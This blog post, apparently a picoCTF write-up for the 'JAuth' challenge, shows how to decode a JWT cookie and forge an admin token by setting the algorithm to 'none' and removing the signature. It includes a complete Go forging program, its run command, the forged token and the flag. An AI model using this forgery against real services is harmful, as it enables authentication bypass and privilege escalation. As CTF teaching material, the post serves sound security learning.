<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>JAuth - lavafroth</title><meta name=description content='The challenge description states that most web application developers use third party components without testing their security.
It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at http://saturn.picoctf.net:52025/
The goal is to become an admin.
We are provied with the username test and the password Test123! to look around.
The challenge is a dummy bank portal. On login, we see the message:'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><noscript><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/noscript.min.css></noscript><link rel=prefetch as=font href=https://lavafroth.is-a.dev/LeagueGothic.ttf><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body class=not-ready data-menu=true><header class=header><div class=coalesce><h1><a class=site-name href=https://lavafroth.is-a.dev/>lavafroth</a></h1><svg class="btn-dark" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 60 60" preserveAspectRatio="xMinYMin meet"><path class="circle" d="M30 16c7.73.0 14 6.27 14 14 0 3.81-1.53 7.27-4 9.8-2.54 2.59-6.08 4.2-10 4.2-7.73.0-14-6.27-14-14 0-7.73 6.27-14 14-14z"/><g class="rays" data-svg-origin="30 30"><line class="line" x1="30" y1="11" x2="30" y2="7"/><line class="line" x1="43.44" y1="16.57" x2="46.26" y2="13.74"/><line class="line" x1="49" y1="30" x2="53" y2="30"/><line class="line" x1="43.43" y1="43.44" x2="46.26" y2="46.26"/><line class="line" x1="30" y1="49" x2="30" y2="53"/><line class="line" x1="16.56" y1="43.43" x2="13.74" y2="46.26"/><line class="line" x1="11" y1="30" x2="7" y2="30"/><line class="line" x1="16.57" y1="16.56" x2="13.74" y2="13.74"/></g></svg></div><nav class=social><a class=github style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a></nav><script>const bodyClx=document.body.classList,btnDark=document.querySelector(".btn-dark"),sysDark=window.matchMedia("(prefers-color-scheme: dark)"),darkVal=localStorage.getItem("dark"),setDark=e=>(bodyClx.toggle("dark",e),localStorage.setItem("dark",e));setDark(darkVal?darkVal==="true":sysDark.matches),requestAnimationFrame(()=>bodyClx.remove("not-ready")),btnDark.addEventListener("click",()=>setDark(!bodyClx.contains("dark"))),sysDark.addEventListener("change",({matches:e})=>setDark(e))</script></header><main class=main><article class=post-single><header class=post-title><p><time>Feb 22, 2022 | 3 minutes read</time></p><h1 data-pagefind-meta=title>JAuth</h1></header><section class=post-content data-pagefind-body><p>The challenge description states that most web application developers use third party components without testing their security.
It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at <a href=http://saturn.picoctf.net:52025/>http://saturn.picoctf.net:52025/</a></p><p>The goal is to become an <code>admin</code>.
We are provied with the username <code>test</code> and the password <code>Test123!</code> to look around.</p><p>The challenge is a dummy bank portal. On login, we see the message:</p><blockquote><p>Hello, You have logged in the testing page. There is nothing to see here.</p></blockquote><p>While logging in, if we check the network requests and responses,
we can see a cookie named <code>token</code> being set.</p><pre tabindex=0><code class=language-none data-lang=none>Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw; path=/; httponly
</code></pre><p>On taking a closer look, the cookie looks like a <a href=https://en.wikipedia.org/wiki/JSON_Web_Token>JSON web token</a>.
JSON web tokens comprise three base64 encoded parts, each separated by a <code>.</code>
These include:</p><ul><li>Header</li><li>Payload</li><li>Verification signature</li></ul><blockquote><p>We can make this educated guess since the value begins with <code>eyJ</code> which partially decodes to <code>{"</code></p></blockquote><p>For this token, we can base64 decode the header and the payload like so:</p><h3 id=header>Header</h3><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></p><p>decodes to</p><p><code>{"typ":"JWT","alg":"HS256"}</code></p><h3 id=payload>Payload</h3><p><code>eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9</code></p><p>decodes to</p><p><code>{"auth":1645518293119,"agent":"Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0","role":"user","iat":1645518293}</code></p><p>Decoding the signature would result in non-printable characters since it is the base64 representation of the HS256
or <a href=https://en.wikipedia.org/wiki/HMAC>HMAC</a> <a href=https://en.wikipedia.org/wiki/SHA-2>SHA256</a> digest of the header,
payload and a 256 bit secret.
Other algorithms include RSA256 (RSA SHA256), ES256 (ECDSA SHA256) and the like.</p><p>For forging an admin&rsquo;s cookie, we would need to modify the <code>"role"</code> field in the payload to <code>"admin"</code>.
However, if we do so, the verification signature becomes invalid for the payload. The only way we can
generate a valid signature is by knowing the 256 bit secret.</p><p>If we pay close attention to the header, we see that the verification algorithm is specified in the cookie.
We can modify the <code>"alg"</code> field of the header to <code>"none"</code> and omit the verification signature completely.
The trailing dot following the encoded payload must be present.</p><p>So, I wrote a little Golang program to do just that.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;encoding/base64&#34;</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;encoding/json&#34;</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;fmt&#34;</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;log&#34;</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;os&#34;</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;strings&#34;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// modify decodes a base64 encoded part of the token,</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// and sets the `whence` field to the value supplied as `what`</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>modify</span>(<span style=color:#a6e22e>part</span>, <span style=color:#a6e22e>whence</span>, <span style=color:#a6e22e>what</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
</span></span><span style=display:flex><span> <span style=color:#75715e>// b has the base64 decoded bytes</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>b</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>base64</span>.<span style=color:#a6e22e>URLEncoding</span>.<span style=color:#a6e22e>DecodeString</span>(<span style=color:#a6e22e>part</span>)
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#75715e>// unmarshal the json data to the structure `p`</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>p</span> <span style=color:#f92672>:=</span> make(<span style=color:#66d9ef>map</span>[<span style=color:#66d9ef>string</span>]<span style=color:#66d9ef>interface</span>{})
</span></span><span style=display:flex><span> <span style=color:#a6e22e>err</span> = <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>Unmarshal</span>(<span style=color:#a6e22e>b</span>, <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>p</span>)
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#75715e>// set the `whence` field to `what`</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>p</span>[<span style=color:#a6e22e>whence</span>] = <span style=color:#a6e22e>what</span>
</span></span><span style=display:flex><span> <span style=color:#75715e>// marshal the modified structure back to json</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>marshalled</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>Marshal</span>(<span style=color:#a6e22e>p</span>)
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#75715e>// return the modified part, encoded with base64</span>
</span></span><span style=display:flex><span> <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Replace</span>(<span style=color:#a6e22e>base64</span>.<span style=color:#a6e22e>URLEncoding</span>.<span style=color:#a6e22e>EncodeToString</span>(<span style=color:#a6e22e>marshalled</span>), <span style=color:#e6db74>&#34;=&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>), <span style=color:#66d9ef>nil</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span> <span style=color:#75715e>// print usage if token is not supplied</span>
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> len(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>) &lt; <span style=color:#ae81ff>2</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Fprintf</span>(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Stderr</span>, <span style=color:#e6db74>&#34;Usage:\n\t%s &lt;token&gt;\n&#34;</span>, <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>[<span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Exit</span>(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#75715e>// split the parts</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Split</span>(<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Args</span>[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;.&#34;</span>)
</span></span><span style=display:flex><span> <span style=color:#75715e>// set the last part to empty since we would not need it</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>2</span>] = <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>part</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>modify</span>(<span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>0</span>], <span style=color:#e6db74>&#34;alg&#34;</span>, <span style=color:#e6db74>&#34;none&#34;</span>)
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatalln</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>0</span>] = <span style=color:#a6e22e>part</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>part</span>, <span style=color:#a6e22e>err</span> = <span style=color:#a6e22e>modify</span>(<span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;role&#34;</span>, <span style=color:#e6db74>&#34;admin&#34;</span>)
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatalln</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>1</span>] = <span style=color:#a6e22e>part</span>
</span></span><span style=display:flex><span> <span style=color:#75715e>// join the parts back</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;Forged token: %v\n&#34;</span>, <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#a6e22e>parts</span>, <span style=color:#e6db74>&#34;.&#34;</span>))
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Now we run:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>go run main.go eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw
</span></span></code></pre></div><p>which gives forged token: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwiYXV0aCI6MTY0NTUxODI5MzExOSwiaWF0IjoxNjQ1NTE4MjkzLCJyb2xlIjoiYWRtaW4ifQ.</code></p><p>Manually setting the cookie to this value, we are redirected to the admin page.</p><blockquote><p>Hello, admin! You have logged in as admin!</p></blockquote><p>and we are greeted with the flag <code>picoCTF{succ3ss_@u7h3nt1c@710n_57072644}</code></p></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/authentication-bypass class=list-tag>Authentication Bypass</a>
<a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/jwt class=list-tag>JWT</a>
<a href=https://lavafroth.is-a.dev/tags/picoctf class=list-tag>PicoCTF</a>
<a href=https://lavafroth.is-a.dev/tags/web class=list-tag>Web</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/picoctf-forensics-operation-oni-operation-orchid/><span>←</span><span>Operation Oni, Operation Orchid</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/liberating-14gib-of-space/><span>Liberating 14GiB of disk space</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a> | <a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a> | <a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a> | <a href=https://lavafroth.is-a.dev/privacy>Privacy</a> | <a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>